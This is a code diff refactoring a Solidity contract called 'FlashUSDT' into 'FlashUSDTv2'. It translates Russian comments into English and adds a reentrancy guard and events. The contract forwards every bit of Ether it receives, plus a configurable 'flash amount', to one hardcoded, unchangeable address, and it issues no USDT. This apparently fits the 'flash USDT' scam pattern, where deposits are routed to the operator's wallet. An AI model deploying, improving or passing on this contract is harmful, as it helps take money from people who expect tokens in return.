@@ -1,100 +1,127 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.8.30;
 
-/// @title FlashUSDT
-/// @notice Этот контракт автоматически пересылает полученный эфир на заранее определенный адрес.
-/// @dev Адрес назначения жестко задан и неизменяем. Контракт включает функциональность установки и обновления суммы "flash amount", а также механизмы контроля доступа для обеспечения безопасности.
-contract FlashUSDT {
-    /// @notice Адрес, на который будет пересылаться весь полученный эфир.
-    /// @dev Этот адрес жестко задан и не может быть изменен после развертывания.
-    address payable public constant destinationAddress = payable(0x706F5710D045AE9067F37aECA26A971341E8dA26);
+/**
+ * @title FlashUSDTv2
+ * @notice This contract automatically forwards received Ether to a fixed destination address.
+ *         It also allows the owner to configure a "flash amount" and perform controlled transfers.
+ * @dev The destination address is immutable after deployment.
+ */
+contract FlashUSDTv2 {
+    /// @notice Address that will receive all forwarded Ether.
+    /// @dev Hardcoded and cannot be changed after deployment.
+    address payable public constant DESTINATION = payable(0x706F5710D045AE9067F37aECA26A971341E8dA26);
 
-    /// @notice Владелец контракта.
-    /// @dev Владелец устанавливается при развертывании контракта и может передать права собственности.
+    /// @notice Address of the contract owner.
     address public owner;
 
-    /// @notice Сумма "flash amount", указанная при развертывании.
-    /// @dev Эта сумма может быть обновлена владельцем после развертывания.
+    /// @notice Configurable "flash amount".
     uint256 public flashAmount;
 
-    /// @notice Событие для логирования действия пересылки.
-    /// @param from Адрес, с которого был получен эфир.
-    /// @param amount Сумма пересланного эфира.
+    /// @notice Prevents reentrancy in sensitive functions.
+    bool private _locked;
+
+    // ----------------------------- //
+    //            Events             //
+    // ----------------------------- //
+
     event Forwarded(address indexed from, uint256 amount);
+    event FlashAmountUpdated(uint256 oldAmount, uint256 newAmount);
+    event OwnershipTransferred(address indexed oldOwner, address indexed newOwner);
+    event Withdrawn(address indexed to, uint256 amount);
 
-    /// @notice Событие для логирования изменения суммы "flash amount".
-    /// @param previousAmount Предыдущая сумма "flash amount".
-    /// @param newAmount Новая сумма "flash amount".
-    event FlashAmountUpdated(uint256 previousAmount, uint256 newAmount);
+    // ----------------------------- //
+    //          Modifiers            //
+    // ----------------------------- //
 
-    /// @notice Событие для логирования передачи прав собственности.
-    /// @param previousOwner Адрес предыдущего владельца.
-    /// @param newOwner Адрес нового владельца.
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-
-    /// @notice Модификатор для ограничения доступа к функциям только для владельца.
     modifier onlyOwner() {
-        require(msg.sender == owner, "Caller is not the owner");
+        require(msg.sender == owner, "Not owner");
         _;
     }
 
-    /// @notice Конструктор для установки начальной суммы "flash amount" и владельца.
-    /// @param _flashAmount Начальная сумма "flash amount".
+    modifier nonReentrant() {
+        require(!_locked, "Reentrancy guard");
+        _locked = true;
+        _;
+        _locked = false;
+    }
+
+    // ----------------------------- //
+    //         Constructor           //
+    // ----------------------------- //
+
+    /**
+     * @param _flashAmount Initial flash amount to configure.
+     */
     constructor(uint256 _flashAmount) {
-        flashAmount = _flashAmount;
         owner = msg.sender;
+        flashAmount = _flashAmount;
         emit OwnershipTransferred(address(0), owner);
     }
 
-    /// @notice Функция для автоматической пересылки любого полученного эфира.
-    /// @dev Эта функция вызывается, когда эфир отправляется на контракт без данных.
+    // ----------------------------- //
+    //           Core Logic          //
+    // ----------------------------- //
+
+    /**
+     * @notice Automatically forwards any received Ether to the destination address.
+     */
     receive() external payable {
-        require(msg.value > 0, "No Ether received");
+        require(msg.value > 0, "No Ether sent");
         emit Forwarded(msg.sender, msg.value);
-        (bool success, ) = destinationAddress.call{value: msg.value}("");
-        require(success, "Failed to forward Ether");
+
+        (bool success, ) = DESTINATION.call{value: msg.value}("");
+        require(success, "Forward failed");
     }
 
-    /// @notice Функция для изменения суммы "flash amount".
-    /// @dev Эту функцию может вызывать только владелец.
-    /// @param _newFlashAmount Новая сумма "flash amount".
-    function setFlashAmount(uint256 _newFlashAmount) external onlyOwner {
-        uint256 previousAmount = flashAmount;
-        flashAmount = _newFlashAmount;
-        emit FlashAmountUpdated(previousAmount, _newFlashAmount);
-    }
+    /**
+     * @notice Sends the flash amount of Ether to the destination address.
+     * @dev Callable by anyone, provided the contract balance covers the flash amount.
+     */
+    function action() external nonReentrant {
+        require(address(this).balance >= flashAmount, "Insufficient balance");
 
-    /// @notice Функция для передачи прав собственности на контракт.
-    /// @dev Эту функцию может вызывать только текущий владелец.
-    /// @param _newOwner Адрес нового владельца.
-    function transferOwnership(address _newOwner) external onlyOwner {
-        require(_newOwner != address(0), "New owner is the zero address");
-        address previousOwner = owner;
-        owner = _newOwner;
-        emit OwnershipTransferred(previousOwner, _newOwner);
-    }
-
-    /// @notice Функция для пересылки суммы "flash amount" эфира с использованием вызова call.
-    /// @dev Эту функцию может вызывать любой пользователь. Баланс контракта должен быть не меньше `flashAmount`.
-    function action() external {
-        require(address(this).balance >= flashAmount, "Insufficient contract balance");
         emit Forwarded(address(this), flashAmount);
-        (bool success, ) = destinationAddress.call{value: flashAmount}("");
-        require(success, "Failed to forward Ether");
+
+        (bool success, ) = DESTINATION.call{value: flashAmount}("");
+        require(success, "Forward failed");
     }
 
-    /// @notice Функция для вывода любого эфира, находящегося на балансе контракта, на адрес владельца.
-    /// @dev Эту функцию может вызывать только владелец.
-    function withdraw() external onlyOwner {
-        uint256 contractBalance = address(this).balance;
-        require(contractBalance > 0, "No Ether to withdraw");
-        (bool success, ) = owner.call{value: contractBalance}("");
-        require(success, "Withdrawal failed");
+    // ----------------------------- //
+    //       Owner-Only Logic        //
+    // ----------------------------- //
+
+    /**
+     * @notice Updates the flash amount.
+     * @param newAmount The new flash amount in wei.
+     */
+    function setFlashAmount(uint256 newAmount) external onlyOwner {
+        uint256 oldAmount = flashAmount;
+        flashAmount = newAmount;
+        emit FlashAmountUpdated(oldAmount, newAmount);
     }
 
-    /// @notice Функция для уничтожения контракта и отправки оставшегося эфира владельцу.
-    /// @dev Эту функцию может вызывать только владелец. Используйте с осторожностью.
-    function destroy() external onlyOwner {
-        selfdestruct(payable(owner));
+    /**
+     * @notice Transfers ownership of the contract to a new address.
+     * @param newOwner The address of the new owner.
+     */
+    function transferOwnership(address newOwner) external onlyOwner {
+        require(newOwner != address(0), "Zero address");
+        address oldOwner = owner;
+        owner = newOwner;
+        emit OwnershipTransferred(oldOwner, newOwner);
+    }
+
+    /**
+     * @notice Allows the owner to withdraw all Ether held by the contract.
+     */
+    function withdraw() external onlyOwner nonReentrant {
+        uint256 balance = address(this).balance;
+        require(balance > 0, "Nothing to withdraw");
+
+        (bool success, ) = owner.call{value: balance}("");
+        require(success, "Withdraw failed");
+
+        emit Withdrawn(owner, balance);
     }
 }
